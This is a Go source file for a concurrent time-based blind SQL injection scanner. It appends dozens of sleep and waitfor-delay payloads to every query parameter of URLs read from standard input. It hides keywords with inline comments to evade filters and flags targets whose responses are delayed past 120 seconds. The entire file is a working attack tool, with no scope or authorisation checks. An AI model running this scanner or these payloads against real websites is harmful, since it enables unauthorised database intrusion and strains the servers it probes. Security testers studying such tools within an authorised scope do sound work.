package main

import (
	"bufio"
	"flag"
	"fmt"
	"math"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

var sql_payloads = []string{
	"sleep(120)#",
	"1 or sleep(120)#",
	"\" or sleep(120)#",
	"' or sleep(120)#\"",
	"\" or sleep(120)=",
	"' or sleep(120)='",
	"1) or sleep(120)#",
	"\") or sleep(120)=\"",
	"') or sleep(120)='",
	"1)) or sleep(120)#",
	"\")) or sleep(120)=\"",
	"')) or sleep(120)='",
	";waitfor delay '0:0:120'--",
	");waitfor delay '0:0:120'--",
	"';waitfor delay '0:0:120'--",
	"\";waitfor delay '0:0:120'--",
	"');waitfor delay '0:0:120'--",
	"\");waitfor delay '0:0:120'--",
	"));waitfor delay '0:0:120'--",
	"'));waitfor delay '0:0:120'--",
	"\"));waitfor delay '0:0:120'--",
	"pg_sleep(5)--",
	"1 or pg_sleep(120)--",
	"\" or pg_sleep(120)--",
	"' or pg_sleep(120)--",
	"1) or pg_sleep(120)--",
	"\") or pg_sleep(120)--",
	"') or pg_sleep(120)--",
	"1)) or pg_sleep(120)--",
	"\")) or pg_sleep(120)--",
	"')) or pg_sleep(120)--",
	"AND (SELECT * FROM (SELECT(SLEEP(120)))bAKL) AND 'vRxe'='vRxe",
	"AND (SELECT * FROM (SELECT(SLEEP(120)))YjoC) AND '%'='",
	"AND (SELECT * FROM (SELECT(SLEEP(120)))nQIP)",
	"AND (SELECT * FROM (SELECT(SLEEP(120)))nQIP)--",
	"AND (SELECT * FROM (SELECT(SLEEP(120)))nQIP)#",
	"SLEEP(120)#",
	"SLEEP(120)--",
	"SLEEP(120)=",
	"SLEEP(120)='",
	"or SLEEP(120)",
	"or SLEEP(120)#",
	"or SLEEP(120)--",
	"or SLEEP(120)=",
	"or SLEEP(120)='",
	"waitfor delay '00:00:120'",
	"waitfor delay '00:00:120'--",
	"waitfor delay '00:00:120'#",
	"pg_SLEEP(120)",
	"pg_SLEEP(120)--",
	"pg_SLEEP(120)#",
	"or pg_SLEEP(120)",
	"or pg_SLEEP(120)--",
	"or pg_SLEEP(120)#",
	"'\"",
	"AnD SLEEP(120)",
	"AnD SLEEP(120)--",
	"AnD SLEEP(120)#",
	"&&SLEEP(120)",
	"&&SLEEP(120)--",
	"&&SLEEP(120)#",
	"' AnD SLEEP(120) ANd '1",
	"'&&SLEEP(120)&&'1",
	"ORDER BY SLEEP(120)",
	"ORDER BY SLEEP(120)--",
	"ORDER BY SLEEP(120)#",
	"(SELECT * FROM (SELECT(SLEEP(120)))ecMj)",
	"(SELECT * FROM (SELECT(SLEEP(120)))ecMj)#",
	"(SELECT * FROM (SELECT(SLEEP(120)))ecMj)--",
	"+ SLEEP(120) + '",
	"SLEEP(120)/*' or SLEEP(120) or '\" or SLEEP(120) or \"*/",
}

func CheckContains(url_t string) bool {
	re := regexp.MustCompile(`\?\w+=.+`)
	return re.MatchString(url_t)
}

func ExtractHostToPrint(url_t string) string {
	uri, _ := url.Parse(url_t)
	return uri.Host + uri.Path
}

func ReplaceWithObfuscatedVersion(sql_payload string) string {
	replacer := strings.NewReplacer("AND", "A/**/ND", "OR", "O/**/R", "SLEEP(", "SL/**/EEP/**/(")
	sql_payload = replacer.Replace(sql_payload)
	return sql_payload
}

func EncodePayloads(decoded_payload url.Values) string {
	return decoded_payload.Encode()
}

func SendGetRequestToNewUrl(new_url string) error {
	_, err := http.Get(new_url)
	return err
}

func TestOneByOneSSTi(url_t string, name string) {
	payloads := url.Values{}
	var new_url string
	for _, sql_payload := range sql_payloads {
		sql_payload = ReplaceWithObfuscatedVersion(sql_payload)
		payloads.Set(name, sql_payload)
		encoded_payloads := EncodePayloads(payloads)
		if CheckContains(url_t) {
			new_url = fmt.Sprintf("%s&%s", url_t, encoded_payloads)
		} else {
			new_url = fmt.Sprintf("%s?%s", url_t, encoded_payloads)
		}
		start := time.Now()
		if SendGetRequestToNewUrl(new_url) != nil {
			return
		}
		if math.Round(time.Since(start).Seconds()) > 120 {
			fmt.Printf("\nPossibly vulnerable to SQLi ---> %s?%s=%s\n", ExtractHostToPrint(url_t), name, sql_payload)
		}
	}

}
func main() {
	reader := bufio.NewScanner(os.Stdin)
	var wg sync.WaitGroup
	conc := flag.Int("concurrency", 10, "concurrency level")
	flag.Parse()
	for i := 0; i < *conc; i++ {
		for reader.Scan() {
			url_t := reader.Text()
			parsedUri, _ := url.Parse(url_t)
			query, _ := url.ParseQuery(parsedUri.RawQuery)
			for name := range query {
				wg.Add(1)
				name_copy := name
				go func() {
					TestOneByOneSSTi(url_t, name_copy)
					wg.Done()
				}()
			}
		}
		wg.Wait()
	}
}
